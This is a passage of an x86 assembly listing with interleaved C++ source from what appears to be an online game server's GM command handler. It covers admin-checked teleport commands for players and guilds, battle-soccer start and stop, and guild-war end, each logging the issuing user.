; 2712 : 					}
; 2713 : 	#endif
; 2714 : 				}
; 2715 : 			}
; 2716 : 		}
; 2717 : 		break;

  019a1	e9 16 23 00 00	 jmp	 $LN2@Management
$LN149@Management:

; 2718 : 
; 2719 : 	case GMCMD_SETPOSITION2 :
; 2720 : 		if(CheckAuthority(AUTHORITY_ADMIN | AUTHORITY_EVENT_GM, lpObj) == true)

  019a6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  019a9	50		 push	 eax
  019aa	6a 22		 push	 34			; 00000022H
  019ac	e8 00 00 00 00	 call	 ?CheckAuthority@@YA_NKPAVOBJECTSTRUCT@@@Z ; CheckAuthority
  019b1	83 c4 08	 add	 esp, 8
  019b4	0f b6 c8	 movzx	 ecx, al
  019b7	83 f9 01	 cmp	 ecx, 1
  019ba	0f 85 ef 00 00
	00		 jne	 $LN152@Management

; 2721 : 		{
; 2722 : 			pId = GetTokenString();

  019c0	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  019c3	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  019c8	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2723 : 			int map, x, y;
; 2724 : 			if( pId == NULL ) return 0;

  019ce	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  019d5	75 07		 jne	 SHORT $LN151@Management
  019d7	33 c0		 xor	 eax, eax
  019d9	e9 e0 22 00 00	 jmp	 $LN1@Management
$LN151@Management:

; 2725 : 			map = GetTokenNumber();

  019de	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  019e1	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  019e6	89 85 28 fb ff
	ff		 mov	 DWORD PTR _map$90[ebp], eax

; 2726 : 			x   = GetTokenNumber();

  019ec	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  019ef	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  019f4	89 85 24 fb ff
	ff		 mov	 DWORD PTR _x$89[ebp], eax

; 2727 : 			y   = GetTokenNumber();

  019fa	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  019fd	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  01a02	89 85 20 fb ff
	ff		 mov	 DWORD PTR _y$88[ebp], eax

; 2728 : 			int aIndex = gObjGetIndex(pId);

  01a08	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01a0e	50		 push	 eax
  01a0f	e8 00 00 00 00	 call	 ?gObjGetIndex@@YAHPAD@Z	; gObjGetIndex
  01a14	83 c4 04	 add	 esp, 4
  01a17	89 85 1c fb ff
	ff		 mov	 DWORD PTR _aIndex$87[ebp], eax

; 2729 : 			if( aIndex >= 0 )

  01a1d	83 bd 1c fb ff
	ff 00		 cmp	 DWORD PTR _aIndex$87[ebp], 0
  01a24	0f 8c 85 00 00
	00		 jl	 $LN152@Management

; 2730 : 			{
; 2731 : 				//## ADD_LOG_GM_COMMAND_20050426
; 2732 : #ifdef ADD_LOG_GM_COMMAND_20040420
; 2733 : 				LPOBJECTSTRUCT	lpTargetObj = gObjFind(pId);

  01a2a	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01a30	50		 push	 eax
  01a31	e8 00 00 00 00	 call	 ?gObjFind@@YAPAVOBJECTSTRUCT@@PAD@Z ; gObjFind
  01a36	83 c4 04	 add	 esp, 4
  01a39	89 85 18 fb ff
	ff		 mov	 DWORD PTR _lpTargetObj$86[ebp], eax

; 2734 : 
; 2735 : 				if( lpTargetObj == NULL ) return 0;

  01a3f	83 bd 18 fb ff
	ff 00		 cmp	 DWORD PTR _lpTargetObj$86[ebp], 0
  01a46	75 07		 jne	 SHORT $LN153@Management
  01a48	33 c0		 xor	 eax, eax
  01a4a	e9 6f 22 00 00	 jmp	 $LN1@Management
$LN153@Management:

; 2736 : 
; 2737 : 				LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] / Target : [%s][%s] : %s", 

  01a4f	68 00 00 00 00	 push	 OFFSET ??_C@_0BB@FJGOBKEK@User?5SetPosition@
  01a54	8b 85 18 fb ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$86[ebp]
  01a5a	83 c0 73	 add	 eax, 115		; 00000073H
  01a5d	50		 push	 eax
  01a5e	8b 8d 18 fb ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$86[ebp]
  01a64	83 c1 68	 add	 ecx, 104		; 00000068H
  01a67	51		 push	 ecx
  01a68	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01a6b	83 c2 73	 add	 edx, 115		; 00000073H
  01a6e	52		 push	 edx
  01a6f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01a72	83 c0 68	 add	 eax, 104		; 00000068H
  01a75	50		 push	 eax
  01a76	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  01a79	83 c1 18	 add	 ecx, 24			; 00000018H
  01a7c	51		 push	 ecx
  01a7d	68 00 00 00 00	 push	 OFFSET ??_C@_0EA@DPOHDNID@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  01a82	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  01a88	83 c4 1c	 add	 esp, 28			; 0000001cH

; 2738 : 					lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, 
; 2739 : 					lpTargetObj->AccountID, lpTargetObj->Name, "User SetPosition");
; 2740 : #endif
; 2741 : 				gObjTeleport(aIndex, map, x, y);

  01a8b	8b 85 20 fb ff
	ff		 mov	 eax, DWORD PTR _y$88[ebp]
  01a91	50		 push	 eax
  01a92	8b 8d 24 fb ff
	ff		 mov	 ecx, DWORD PTR _x$89[ebp]
  01a98	51		 push	 ecx
  01a99	8b 95 28 fb ff
	ff		 mov	 edx, DWORD PTR _map$90[ebp]
  01a9f	52		 push	 edx
  01aa0	8b 85 1c fb ff
	ff		 mov	 eax, DWORD PTR _aIndex$87[ebp]
  01aa6	50		 push	 eax
  01aa7	e8 00 00 00 00	 call	 ?gObjTeleport@@YAXHHHH@Z ; gObjTeleport
  01aac	83 c4 10	 add	 esp, 16			; 00000010H
$LN152@Management:

; 2742 : 			}
; 2743 : 		}
; 2744 : 		break;

  01aaf	e9 08 22 00 00	 jmp	 $LN2@Management
$LN154@Management:

; 2745 : 
; 2746 : 	case GMCMD_GUILDSETPOSITION :
; 2747 : //		if( (lpObj->AuthorityCode&AUTHORITY_CODE_SETPOSITION) != AUTHORITY_CODE_SETPOSITION) return 0;
; 2748 : 		{
; 2749 : 			
; 2750 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2751 : 			LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  01ab4	68 00 00 00 00	 push	 OFFSET ??_C@_0BC@HIAMIIED@Guild?5SetPosition@
  01ab9	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01abc	83 c0 73	 add	 eax, 115		; 00000073H
  01abf	50		 push	 eax
  01ac0	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  01ac3	83 c1 68	 add	 ecx, 104		; 00000068H
  01ac6	51		 push	 ecx
  01ac7	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01aca	83 c2 18	 add	 edx, 24			; 00000018H
  01acd	52		 push	 edx
  01ace	68 00 00 00 00	 push	 OFFSET ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  01ad3	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  01ad9	83 c4 14	 add	 esp, 20			; 00000014H

; 2752 : 				lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "Guild SetPosition");
; 2753 : 	#endif
; 2754 : 
; 2755 : 		pId = GetTokenString();

  01adc	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  01adf	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  01ae4	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2756 : 		int map, x, y;
; 2757 : 		if( pId == NULL ) return 0;

  01aea	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  01af1	75 07		 jne	 SHORT $LN155@Management
  01af3	33 c0		 xor	 eax, eax
  01af5	e9 c4 21 00 00	 jmp	 $LN1@Management
$LN155@Management:

; 2758 : 		
; 2759 : 		map = GetTokenNumber();

  01afa	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  01afd	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  01b02	89 85 14 fb ff
	ff		 mov	 DWORD PTR _map$85[ebp], eax

; 2760 : 		x   = GetTokenNumber();

  01b08	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  01b0b	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  01b10	89 85 10 fb ff
	ff		 mov	 DWORD PTR _x$84[ebp], eax

; 2761 : 		y   = GetTokenNumber();

  01b16	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  01b19	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  01b1e	89 85 0c fb ff
	ff		 mov	 DWORD PTR _y$83[ebp], eax

; 2762 : 		
; 2763 : 		LPGUILD_INFO lpNode = Guild.SearchGuild(pId);

  01b24	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01b2a	50		 push	 eax
  01b2b	b9 00 00 00 00	 mov	 ecx, OFFSET ?Guild@@3VCGuildClass@@A ; Guild
  01b30	e8 00 00 00 00	 call	 ?SearchGuild@CGuildClass@@QAEPAU_GUILD_INFO_STRUCT@@PAD@Z ; CGuildClass::SearchGuild
  01b35	89 85 08 fb ff
	ff		 mov	 DWORD PTR _lpNode$82[ebp], eax

; 2764 : 		if( lpNode != NULL )

  01b3b	83 bd 08 fb ff
	ff 00		 cmp	 DWORD PTR _lpNode$82[ebp], 0
  01b42	0f 84 9a 00 00
	00		 je	 $LN41@Management

; 2765 : 		{
; 2766 : 			int g_index;
; 2767 : 			for( int n=0; n<MAX_GUILD; n++)

  01b48	c7 85 00 fb ff
	ff 00 00 00 00	 mov	 DWORD PTR _n$80[ebp], 0
  01b52	eb 0f		 jmp	 SHORT $LN42@Management
$LN40@Management:
  01b54	8b 85 00 fb ff
	ff		 mov	 eax, DWORD PTR _n$80[ebp]
  01b5a	83 c0 01	 add	 eax, 1
  01b5d	89 85 00 fb ff
	ff		 mov	 DWORD PTR _n$80[ebp], eax
$LN42@Management:
  01b63	83 bd 00 fb ff
	ff 50		 cmp	 DWORD PTR _n$80[ebp], 80 ; 00000050H
  01b6a	7d 76		 jge	 SHORT $LN41@Management

; 2768 : 			{				
; 2769 : 				if( lpNode->Index[n] >= 0 )

  01b6c	8b 85 00 fb ff
	ff		 mov	 eax, DWORD PTR _n$80[ebp]
  01b72	8b 8d 08 fb ff
	ff		 mov	 ecx, DWORD PTR _lpNode$82[ebp]
  01b78	0f bf 94 41 a0
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax*2+928]
  01b80	85 d2		 test	 edx, edx
  01b82	7c 59		 jl	 SHORT $LN157@Management

; 2770 : 				{
; 2771 : 					g_index = lpNode->Index[n];

  01b84	8b 85 00 fb ff
	ff		 mov	 eax, DWORD PTR _n$80[ebp]
  01b8a	8b 8d 08 fb ff
	ff		 mov	 ecx, DWORD PTR _lpNode$82[ebp]
  01b90	0f bf 94 41 a0
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax*2+928]
  01b98	89 95 04 fb ff
	ff		 mov	 DWORD PTR _g_index$81[ebp], edx

; 2772 : 					gObjTeleport(g_index, map, x++, y);

  01b9e	8b 85 10 fb ff
	ff		 mov	 eax, DWORD PTR _x$84[ebp]
  01ba4	89 85 84 e5 ff
	ff		 mov	 DWORD PTR tv1247[ebp], eax
  01baa	8b 8d 0c fb ff
	ff		 mov	 ecx, DWORD PTR _y$83[ebp]
  01bb0	51		 push	 ecx
  01bb1	8b 95 84 e5 ff
	ff		 mov	 edx, DWORD PTR tv1247[ebp]
  01bb7	52		 push	 edx
  01bb8	8b 85 14 fb ff
	ff		 mov	 eax, DWORD PTR _map$85[ebp]
  01bbe	50		 push	 eax
  01bbf	8b 8d 04 fb ff
	ff		 mov	 ecx, DWORD PTR _g_index$81[ebp]
  01bc5	51		 push	 ecx
  01bc6	e8 00 00 00 00	 call	 ?gObjTeleport@@YAXHHHH@Z ; gObjTeleport
  01bcb	83 c4 10	 add	 esp, 16			; 00000010H
  01bce	8b 95 10 fb ff
	ff		 mov	 edx, DWORD PTR _x$84[ebp]
  01bd4	83 c2 01	 add	 edx, 1
  01bd7	89 95 10 fb ff
	ff		 mov	 DWORD PTR _x$84[ebp], edx
$LN157@Management:

; 2773 : 				}
; 2774 : 			}

  01bdd	e9 72 ff ff ff	 jmp	 $LN40@Management
$LN41@Management:

; 2775 : 		}
; 2776 : 		}		
; 2777 : 		break;

  01be2	e9 d5 20 00 00	 jmp	 $LN2@Management
$LN158@Management:

; 2778 : 	case GMCMD_GUILDWARSTART :	//  
; 2779 : 		if( (lpObj->Authority&AUTHORITY_ADMIN) == AUTHORITY_ADMIN ) 

  01be7	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01bea	8b 88 a4 01 00
	00		 mov	 ecx, DWORD PTR [eax+420]
  01bf0	83 e1 02	 and	 ecx, 2
  01bf3	74 32		 je	 SHORT $LN159@Management

; 2780 : 		{
; 2781 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2782 : 			LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  01bf5	68 00 00 00 00	 push	 OFFSET ??_C@_0BD@EFECDMGE@Start?5BattleSoccer@
  01bfa	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01bfd	83 c0 73	 add	 eax, 115		; 00000073H
  01c00	50		 push	 eax
  01c01	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  01c04	83 c1 68	 add	 ecx, 104		; 00000068H
  01c07	51		 push	 ecx
  01c08	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01c0b	83 c2 18	 add	 edx, 24			; 00000018H
  01c0e	52		 push	 edx
  01c0f	68 00 00 00 00	 push	 OFFSET ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  01c14	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  01c1a	83 c4 14	 add	 esp, 20			; 00000014H

; 2783 : 				lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "Start BattleSoccer");
; 2784 : 	#endif
; 2785 : 			BattleSoccerGoalStart(0);

  01c1d	6a 00		 push	 0
  01c1f	e8 00 00 00 00	 call	 ?BattleSoccerGoalStart@@YAXH@Z ; BattleSoccerGoalStart
  01c24	83 c4 04	 add	 esp, 4
$LN159@Management:

; 2786 : 		}
; 2787 : 		break;

  01c27	e9 90 20 00 00	 jmp	 $LN2@Management
$LN160@Management:

; 2788 : 	case GMCMD_GUILDWARSTOP :
; 2789 : 		if( (lpObj->Authority&AUTHORITY_ADMIN) == AUTHORITY_ADMIN ) 

  01c2c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01c2f	8b 88 a4 01 00
	00		 mov	 ecx, DWORD PTR [eax+420]
  01c35	83 e1 02	 and	 ecx, 2
  01c38	74 34		 je	 SHORT $LN161@Management

; 2790 : 		{
; 2791 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2792 : 			LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  01c3a	68 00 00 00 00	 push	 OFFSET ??_C@_0BC@DPMLLFMM@Stop?5BattleSoccer@
  01c3f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01c42	83 c0 73	 add	 eax, 115		; 00000073H
  01c45	50		 push	 eax
  01c46	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  01c49	83 c1 68	 add	 ecx, 104		; 00000068H
  01c4c	51		 push	 ecx
  01c4d	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01c50	83 c2 18	 add	 edx, 24			; 00000018H
  01c53	52		 push	 edx
  01c54	68 00 00 00 00	 push	 OFFSET ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  01c59	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  01c5f	83 c4 14	 add	 esp, 20			; 00000014H

; 2793 : 				lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "Stop BattleSoccer");
; 2794 : 	#endif
; 2795 : 			BattleSoccerGoalEnd(0);

  01c62	6a 00		 push	 0
  01c64	e8 00 00 00 00	 call	 ?BattleSoccerGoalEnd@@YAXH@Z ; BattleSoccerGoalEnd
  01c69	83 c4 04	 add	 esp, 4

; 2796 : 		}

  01c6c	eb 72		 jmp	 SHORT $LN166@Management
$LN161@Management:

; 2797 : 		else
; 2798 : 		{
; 2799 : 			//        .
; 2800 : 			if( gObj[aIndex].lpGuild )

  01c6e	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01c75	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01c7b	83 bc 01 94 02
	00 00 00	 cmp	 DWORD PTR [ecx+eax+660], 0
  01c83	74 5b		 je	 SHORT $LN166@Management

; 2801 : 			{
; 2802 : 				//   ?
; 2803 : 				if( gObj[aIndex].lpGuild->WarType == 1 )

  01c85	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01c8c	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01c92	8b 94 01 94 02
	00 00		 mov	 edx, DWORD PTR [ecx+eax+660]
  01c99	0f b6 82 92 05
	00 00		 movzx	 eax, BYTE PTR [edx+1426]
  01ca0	83 f8 01	 cmp	 eax, 1
  01ca3	75 3b		 jne	 SHORT $LN166@Management

; 2804 : 				{
; 2805 : 					if( strcmp( gObj[aIndex].Name, gObj[aIndex].lpGuild->Names[0] ) == 0 )

  01ca5	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01cac	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01cb2	8b 94 01 94 02
	00 00		 mov	 edx, DWORD PTR [ecx+eax+660]
  01cb9	b8 0b 00 00 00	 mov	 eax, 11			; 0000000bH
  01cbe	6b c8 00	 imul	 ecx, eax, 0
  01cc1	8d 54 0a 2f	 lea	 edx, DWORD PTR [edx+ecx+47]
  01cc5	52		 push	 edx
  01cc6	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01ccd	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01cd3	8d 54 01 73	 lea	 edx, DWORD PTR [ecx+eax+115]
  01cd7	52		 push	 edx
  01cd8	e8 00 00 00 00	 call	 _strcmp
  01cdd	83 c4 08	 add	 esp, 8
$LN166@Management:

; 2806 : 					{					
; 2807 : 						if( gObj[aIndex].lpGuild->BattleGroundIndex >= 0 )
; 2808 : 						{
; 2809 : 							//BattleSoccerGoalEnd(gObj[aIndex].lpGuild->BattleGroundIndex);
; 2810 : 							//GCServerMsgStringSend("GuildMaster  3    .", aIndex, 0);
; 2811 : 						}
; 2812 : 					}
; 2813 : 				}
; 2814 : 			}			
; 2815 : 		}
; 2816 : 		break;

  01ce0	e9 d7 1f 00 00	 jmp	 $LN2@Management
$LN167@Management:

; 2817 : 	case GMCMD_GUILDWAREND :
; 2818 : 		if( (lpObj->Authority&AUTHORITY_ADMIN) == AUTHORITY_ADMIN ) 

  01ce5	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01ce8	8b 88 a4 01 00
	00		 mov	 ecx, DWORD PTR [eax+420]
  01cee	83 e1 02	 and	 ecx, 2
  01cf1	74 53		 je	 SHORT $LN168@Management

; 2819 : 		{
; 2820 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2821 : 			LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  01cf3	68 00 00 00 00	 push	 OFFSET ??_C@_0N@GPDFKJGB@End?5GuildWar@
  01cf8	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01cfb	83 c0 73	 add	 eax, 115		; 00000073H
  01cfe	50		 push	 eax
  01cff	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  01d02	83 c1 68	 add	 ecx, 104		; 00000068H
  01d05	51		 push	 ecx
  01d06	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01d09	83 c2 18	 add	 edx, 24			; 00000018H
  01d0c	52		 push	 edx
  01d0d	68 00 00 00 00	 push	 OFFSET ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  01d12	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  01d18	83 c4 14	 add	 esp, 20			; 00000014H

; 2822 : 				lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "End GuildWar");
; 2823 : 	#endif
; 2824 : 			char *pId;
; 2825 : 			pId = GetTokenString();

  01d1b	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  01d1e	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  01d23	89 85 fc fa ff
	ff		 mov	 DWORD PTR _pId$79[ebp], eax

; 2826 : 			if( pId != NULL ) 

  01d29	83 bd fc fa ff
	ff 00		 cmp	 DWORD PTR _pId$79[ebp], 0
  01d30	74 0f		 je	 SHORT $LN170@Management

; 2827 : 			{
; 2828 : 				GCManagerGuildWarEnd(pId);

  01d32	8b 85 fc fa ff
	ff		 mov	 eax, DWORD PTR _pId$79[ebp]
  01d38	50		 push	 eax
  01d39	e8 00 00 00 00	 call	 ?GCManagerGuildWarEnd@@YAXPAD@Z ; GCManagerGuildWarEnd
  01d3e	83 c4 04	 add	 esp, 4
$LN170@Management:

; 2829 : 			}
; 2830 : 		}

  01d41	e9 7d 01 00 00	 jmp	 $LN173@Management
$LN168@Management:

; 2831 : 		else
; 2832 : 		{
; 2833 : 			//       .
; 2834 : 			if( gObj[aIndex].lpGuild && gObj[aIndex].lpGuild->lpTargetGuildNode )

  01d46	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01d4d	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01d53	83 bc 01 94 02
	00 00 00	 cmp	 DWORD PTR [ecx+eax+660], 0
  01d5b	0f 84 62 01 00
	00		 je	 $LN173@Management
  01d61	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01d68	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01d6e	8b 94 01 94 02
	00 00		 mov	 edx, DWORD PTR [ecx+eax+660]
  01d75	83 ba 8c 05 00
	00 00		 cmp	 DWORD PTR [edx+1420], 0
  01d7c	0f 84 41 01 00
	00		 je	 $LN173@Management

; 2835 : 			{
; 2836 : 				if( strcmp( gObj[aIndex].Name, gObj[aIndex].lpGuild->Names[0] ) == 0 )

  01d82	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01d89	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01d8f	8b 94 01 94 02
	00 00		 mov	 edx, DWORD PTR [ecx+eax+660]
  01d96	b8 0b 00 00 00	 mov	 eax, 11			; 0000000bH
  01d9b	6b c8 00	 imul	 ecx, eax, 0
  01d9e	8d 54 0a 2f	 lea	 edx, DWORD PTR [edx+ecx+47]
  01da2	52		 push	 edx
  01da3	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01daa	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01db0	8d 54 01 73	 lea	 edx, DWORD PTR [ecx+eax+115]
  01db4	52		 push	 edx
  01db5	e8 00 00 00 00	 call	 _strcmp
  01dba	83 c4 08	 add	 esp, 8
  01dbd	85 c0		 test	 eax, eax
  01dbf	0f 85 fe 00 00
	00		 jne	 $LN173@Management

; 2837 : 				{
; 2838 : 					if( gObj[aIndex].lpGuild->BattleGroundIndex >= 0 && gObj[aIndex].lpGuild->WarType == 1)

  01dc5	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01dcc	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01dd2	8b 94 01 94 02
	00 00		 mov	 edx, DWORD PTR [ecx+eax+660]
  01dd9	0f b6 82 93 05
	00 00		 movzx	 eax, BYTE PTR [edx+1427]
  01de0	85 c0		 test	 eax, eax
  01de2	0f 8c db 00 00
	00		 jl	 $LN173@Management
  01de8	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01def	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01df5	8b 94 01 94 02
	00 00		 mov	 edx, DWORD PTR [ecx+eax+660]
  01dfc	0f b6 82 92 05
	00 00		 movzx	 eax, BYTE PTR [edx+1426]
  01e03	83 f8 01	 cmp	 eax, 1
  01e06	0f 85 b7 00 00
	00		 jne	 $LN173@Management

; 2839 : 					{
; 2840 : 						gObjAddMsgSendDelay(&gObj[aIndex], MSG_BSSTOP, aIndex, 1000*10);

  01e0c	6a 00		 push	 0
  01e0e	68 10 27 00 00	 push	 10000			; 00002710H
  01e13	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  01e16	50		 push	 eax
  01e17	6a 07		 push	 7
  01e19	69 4d 10 a0 1b
	00 00		 imul	 ecx, DWORD PTR _aIndex$[ebp], 7072
  01e20	03 0d 00 00 00
	00		 add	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01e26	51		 push	 ecx
  01e27	e8 00 00 00 00	 call	 ?gObjAddMsgSendDelay@@YAXPAVOBJECTSTRUCT@@HHHH@Z ; gObjAddMsgSendDelay
  01e2c	83 c4 14	 add	 esp, 20			; 00000014H

; 2841 : 						
; 2842 : 						char szTemp[100];
; 2843 : 
; 2844 : 						wsprintf(szTemp, lMsg.Get(1153), gObj[aIndex].lpGuild->Names[0]);

  01e2f	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01e36	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01e3c	8b 94 01 94 02
	00 00		 mov	 edx, DWORD PTR [ecx+eax+660]
  01e43	b8 0b 00 00 00	 mov	 eax, 11			; 0000000bH
  01e48	6b c8 00	 imul	 ecx, eax, 0
  01e4b	8d 54 0a 2f	 lea	 edx, DWORD PTR [edx+ecx+47]
  01e4f	52		 push	 edx
  01e50	68 81 04 00 00	 push	 1153			; 00000481H
  01e55	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  01e5a	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  01e60	50		 push	 eax
  01e61	8d 85 98 fa ff
	ff		 lea	 eax, DWORD PTR _szTemp$78[ebp]
  01e67	50		 push	 eax
  01e68	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  01e6e	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2845 : 						GCServerMsgStringSendGuild(gObj[aIndex].lpGuild, szTemp, 1);

  01e71	6a 01		 push	 1
  01e73	8d 85 98 fa ff
	ff		 lea	 eax, DWORD PTR _szTemp$78[ebp]
  01e79	50		 push	 eax
  01e7a	69 4d 10 a0 1b
	00 00		 imul	 ecx, DWORD PTR _aIndex$[ebp], 7072
  01e81	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01e87	8b 84 0a 94 02
	00 00		 mov	 eax, DWORD PTR [edx+ecx+660]
  01e8e	50		 push	 eax
